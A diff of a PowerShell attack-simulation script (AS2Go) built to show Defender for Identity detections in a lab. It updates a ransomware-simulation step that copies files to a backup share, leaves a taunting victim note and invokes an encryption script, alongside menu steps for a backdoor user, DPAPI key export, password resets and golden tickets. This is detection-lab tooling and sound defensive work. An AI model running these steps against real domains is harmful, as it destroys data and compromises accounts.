@@ -1,7 +1,7 @@
-﻿<#
+<#
 .SYNOPSIS
 
-Attack scenario to GO - along the kill-chain (AStGO)
+Attack scenario to GO - along the kill-chain (AS2Go)
 
 Requirements:
 
@@ -16,7 +16,7 @@ The purpose of this script is to illustrate Defender for Identity's capabilities
 
 .NOTES
 
-last update: 2022-01-10
+last update: 2022-01-11
 File Name  : AS2Go.ps1 | Version 2.xx
 Author     : Holger Zimmermann | hozimmer@microsoft.com
 
@@ -30,7 +30,13 @@ PS> .\AS2Go.ps1
 .LINK
 https://docs.microsoft.com/en-us/defender-for-identity/playbook-lab-overview
 
+
 #>
+
+
+#change log
+# 2022-01-11 | v2.0.3 |  Update Function SimulateRansomare
+
 
 #Check if the current Windows PowerShell session is running as Administrator. 
 #If not Start Windows PowerShell by  using the Run as Administrator option, and then try running the script again.
@@ -44,15 +50,14 @@ https://docs.microsoft.com/en-us/defender-for-identity/playbook-lab-overview
 ######                                                                     #####
 ################################################################################
 
-$lastupdate   = "2022-01-10"
-$version      = "2.02.000" 
+$lastupdate   = "2022-01-11"
+$version      = "2.03.000" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
 $configFile   = "$path\AS2Go.xml"
 $tmp          = "$path\AS2Go.tmp"
 $exfiltration = "$path\Exfiltration"
-
 $exit = "x"
 $yes  = "Y"
 $no   = "N"
@@ -97,33 +102,52 @@ function SimulateRansomare
     Param(
     [Parameter(Mandatory=$True)]
     [string]
-    $Computer
+    $BackupShare
     )
 
 $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 #####
 
-#$Computer = "MTP-DC19"
+
+#$BackupShare = "\\NUC-VICTIMPC\C$\TEMP\AS2Go"
+
+#prepare the simulation
 $path       =  Get-Location
 $filePrefix = (Get-Date).toString("yyyyMMdd_HHmmss")
-$newFile = "$path\$filePrefix.txt"
 
-(Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hallo Ulf, vielen Dank für die Einladung!"  | Out-File -FilePath $newFile
-Copy-Item -Path ".\$filePrefix.txt" -Destination "\\$Computer\c$\#unprotectedfolder" -Recurse
-Invoke-Item "\\$Computer\c$\#unprotectedfolder\$filePrefix.txt"
-Write-Host "`n Content from file \\$Computer\c$\#unprotectedfolder\$filePrefix.txt before encryption"
+#create temp directory and fill the directory
+$FolderToEncrypt = "$BackupShare\" + $env:USERNAME
+New-Item -Path $FolderToEncrypt -ItemType Directory  -ErrorAction Ignore
+Copy-Item "$path\*.*" -Destination $FolderToEncrypt -Exclude *.exe,*.ps1
+
+# create info for the victim
+$newFile    = "$path\$filePrefix.txt"
+(Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hi $env:USERNAME, by the next time, I'll encrypt also your Active Dictory Backup files."  | Out-File -FilePath $newFile 
+Get-Item $FolderToEncrypt\*.* | Out-File -FilePath $newFile -Append
+Copy-Item -Path ".\$filePrefix.txt" -Destination $FolderToEncrypt -Recurse
+Invoke-Item "$FolderToEncrypt\$filePrefix.txt"
+
+Write-Host "`n Content from file $FolderToEncrypt\$filePrefix.txt before encryption"
+
 
 $question = "`nDo you REALLY want to run this step - Y or N? Default "
-$answer   = Get-Answer -question $question -defaultValue $Yes
+$answer   = Get-Answer -question $question -defaultValue $no
 
 If ($answer -eq $yes)
    {
-        #run functions
-    .\HZ-encrypt-ransomware.ps1 -share "\\$Computer\c$\#unprotectedfolder"
+    
+    Write-Host "`n"
+    Write-Warning "All files in $FolderToEncrypt will be encrypted NOW!"
+    Write-Host "`n"
+    pause
+    
+    Check-FileAvailabliy -filename "AS2Go-Encryption.ps1"
+    .\AS2Go-Encryption.ps1 -share $FolderToEncrypt
+    
     Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight 
-    Write-host "`  --> \\$Computer\c$\#unprotectedfolder\$filePrefix.txt" -ForegroundColor $global:FGCHighLight
-    Invoke-Item "\\$Computer\c$\#unprotectedfolder\$filePrefix.txt"   
+    Write-host "`  --> $FolderToEncrypt\$filePrefix.txt" -ForegroundColor $global:FGCHighLight
+    Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
     }
 
 
@@ -2091,9 +2115,10 @@ If ($answer -eq $yes)
     If ($answer -eq $yes)
     {
     New-BackDoorUser
+    pause
     } 
     
-    Pause
+    #Pause
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        try to export DATA PROTECTION API master key                "
@@ -2115,7 +2140,7 @@ If ($answer -eq $yes)
     }
      
  
-     Clear-Host
+    Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            User Manipulation - Disable & PW reset                   "
     Write-Host "____________________________________________________________________`n" 
@@ -2129,22 +2154,24 @@ If ($answer -eq $yes)
     {
         $MySearchBase = Get-KeyValue -key "MySearchBase"
         Start-UserManipulation -SearchBase $MySearchBase
+        Pause
     } 
 
 
-    Pause
+    #Pause
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "                 ran ransomware attack?                               "
     Write-Host "____________________________________________________________________`n"     
     
     $question = "`nDo you want to run this step - Y or N? Default "
-    $answer   = Get-Answer -question $question -defaultValue $Yes
+    $answer   = Get-Answer -question $question -defaultValue $no
 
     If ($answer -eq $yes)
     {
         #run functions
-        # SimulateRansomare -Computer $mySAW
+        SimulateRansomare -BackupShare $OfflineDITFile
+        Pause
     }
  
     
@@ -2161,9 +2188,10 @@ If ($answer -eq $yes)
 
         #run function
         CreateGoldenTicket
+        Pause
     } 
     
-    Pause
+    #Pause
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "                 reboot (all machines)                              "
